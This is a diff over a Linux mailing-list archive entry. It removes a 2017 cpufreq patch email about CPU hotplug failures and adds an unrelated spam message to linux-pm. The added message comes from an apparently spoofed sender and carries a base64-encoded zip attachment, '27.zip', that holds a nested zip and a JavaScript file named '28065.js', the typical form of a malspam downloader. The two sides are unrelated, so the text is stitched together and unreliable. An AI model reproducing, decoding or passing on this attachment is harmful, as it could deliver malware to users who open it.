@@ -1,86 +1,64 @@
-From: Chen Yu <yu.c.chen@intel.com>
-Subject: [PATCH][RFC] cpufreq: Bring CPUs up even if cpufreq_online failed
-Date: Sat, 25 Mar 2017 12:20:11 +0800
-Message-ID: <1490415611-16945-1-git-send-email-yu.c.chen@intel.com>
-Return-path: <stable-owner@vger.kernel.org>
-Sender: stable-owner@vger.kernel.org
-To: linux-pm@vger.kernel.org
-Cc: linux-kernel@vger.kernel.org, Sebastian Andrzej Siewior <bigeasy@linutronix.de>, Chen Yu <yu.c.chen@intel.com>, "Rafael J. Wysocki" <rjw@rjwysocki.net>, Viresh Kumar <viresh.kumar@linaro.org>, "Stable # 4 . 9+" <stable@vger.kernel.org>
+From: <joseph.x.hronec@espn.com>
+Subject: 28065 linux-pm
+Date: Sat, 25 Mar 2017 08:12:13 -0000
+Message-ID: <149042953307.16100.8083563334815509138@rima-tde.net>
+Reply-To: <joseph.x.hronec@espn.com>
+Mime-Version: 1.0
+Content-Type: application/zip; name="27.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-pm-owner@vger.kernel.org>
+Received: from 126.red-95-122-142.staticip.rima-tde.net ([95.122.142.126]:54082
+        "HELO rima-tde.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1750723AbdCYIMQ (ORCPT
+        <rfc822;linux-pm@vger.kernel.org>); Sat, 25 Mar 2017 04:12:16 -0400
+Content-Disposition: attachment
+Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
+To: linux-pm <linux-pm@vger.kernel.org>
 
-There is a report that after
-commit 27622b061eb4 ("cpufreq: Convert to hotplug state machine"),
-the normal CPU offline/online cycle failed on some platforms.
-According to the ftrace result, this problem was triggered on
-platforms using acpi-freq as the default cpufreq driver,
-and due to the lack of some ACPI freq method(_PCT eg), the
-cpufreq_online failed and returned a negative value, thus the cpu
-hotplug statemachine rollbacked the CPU online process. Actually
-the failure of cpufreq_online should not impact the whole CPU
-online process according to the original semantics before above patch.
-BTW, during system bootup the cpufreq_online is not invoked via
-cpuhotplug statemachine but by the cpufreq device creation process,
-thus the APs can be brought up although cpufreq_online failed in that
-stage.
-
-This patch ignores the return value of cpufreq_online/offline and
-prints a warning if there is a failure.
-
-Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=194581
-Fixes: 27622b061eb4 ("cpufreq: Convert to hotplug state machine")
-Reported-and-tested-by: Tomasz Maciej Nowak <tmn505@gmail.com>
-Cc: "Rafael J. Wysocki" <rjw@rjwysocki.net>
-Cc: Viresh Kumar <viresh.kumar@linaro.org>
-Cc: linux-pm@vger.kernel.org
-Cc: Stable <stable@vger.kernel.org> # 4.9+
-Signed-off-by: Chen Yu <yu.c.chen@intel.com>
----
- drivers/cpufreq/cpufreq.c | 26 ++++++++++++++++++++++++--
- 1 file changed, 24 insertions(+), 2 deletions(-)
-
-diff --git a/drivers/cpufreq/cpufreq.c b/drivers/cpufreq/cpufreq.c
-index b8ff617..1c13873 100644
---- a/drivers/cpufreq/cpufreq.c
-+++ b/drivers/cpufreq/cpufreq.c
-@@ -2391,6 +2391,28 @@ EXPORT_SYMBOL_GPL(cpufreq_boost_enabled);
-  *********************************************************************/
- static enum cpuhp_state hp_online;
- 
-+static int cpuhp_cpufreq_online(unsigned int cpu)
-+{
-+	int ret = cpufreq_online(cpu);
-+
-+	if (ret)
-+		pr_err("Failed to bring cpufreq online for CPU%u. (%d)\n",
-+			cpu, ret);
-+
-+	return 0;
-+}
-+
-+static int cpuhp_cpufreq_offline(unsigned int cpu)
-+{
-+	int ret = cpufreq_offline(cpu);
-+
-+	if (ret)
-+		pr_err("Failed to put cpufreq offline for CPU%u. (%d)\n",
-+			cpu, ret);
-+
-+	return 0;
-+}
-+
- /**
-  * cpufreq_register_driver - register a CPU Frequency driver
-  * @driver_data: A struct cpufreq_driver containing the values#
-@@ -2453,8 +2475,8 @@ int cpufreq_register_driver(struct cpufreq_driver *driver_data)
- 	}
- 
- 	ret = cpuhp_setup_state_nocalls(CPUHP_AP_ONLINE_DYN, "cpufreq:online",
--					cpufreq_online,
--					cpufreq_offline);
-+					cpuhp_cpufreq_online,
-+					cpuhp_cpufreq_offline);
- 	if (ret < 0)
- 		goto err_if_unreg;
- 	hp_online = ret;
--- 
-2.7.4
+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
+cG8sdmEG5S6ZrF/Q3Sbc5Fm63WcU5d4t6j8OVYnu9CYVAzFszzLCuFUNJffyDDekQsPamXG+dvZS
+5V4ZU6CCjcxHtOXU00FNibJ578pUm6jnFGllvol0UtQX6zJ/ZtF0H8k1UzIFOnsaEQvwQJKkZ97n
+KkCVVWdmPAYBCof9/ava+PW9lQKUSWgB2dm9LDpJ9i2+lZJa8qYzz3k38QjVSa2sFapmTz7MY+73
+b7PzNm5EXe/UW9R2c8r+fb95u79cfwjh+dPjR+Pu15Lz68tXH7bXF/3ny3s/mby9/levsvPdq/OL
+vr3Zv+07effdzf69/Jmf58rzo7MjdTof56az7WV/d/S3g/nt5vrm9s315mQja3POP12fyfu/7vf5
+/VYHd6KNOjEmnSDgJ/zTdjkxi+Wr3cntVc63Z9PAk9f5pr7afv/8+dOP5tP3L3cn79++Pr86e755
+vjnJt1cfrs7U6bjab6eb9fmk/5z37/l+Pv95Wnty0S9f3rxavzo+XpccH+8+no/t/PyXsxnkYd3u
+452NT9Pf0eb45U9Xby62u+PN2dOb/fnlyydjf/X6h1d5/8NV69vrvH/T/355s53enk03L0603/1z
+mn02zb3YnX76Yui3/m620+XudLM7pGe3wlz2Pf84P36S/+pEpu93n/MiX3/6kvW7XN7P+sHJl4S/
+zh/O92ebfnx7kY/zRb/dfIb86UctiJ8eVr67/rG9P5vrn/0j37x6Mi6uAH5+3OfLdvV6uzv602rw
+DsYX90g496/hrNw7/F63O/0FUEsBAh4DFAACAAgAQ255ShPfQ5LjCAAAwhMAAAgAGAAAAAAAAQAA
+AKSBAAAAADI4MDY1LmpzVVQFAAMtIdZYdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEATgAAACUJ
+AAAAAFBLAQIeAwoAAgAAAENueUoSWhjRiQkAAIkJAAANABgAAAAAAAAAAACkgQAAAAB6aXAtMjgw
+NjUuemlwVVQFAAMtIdZYdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAUwAAANAJAAAAAA==
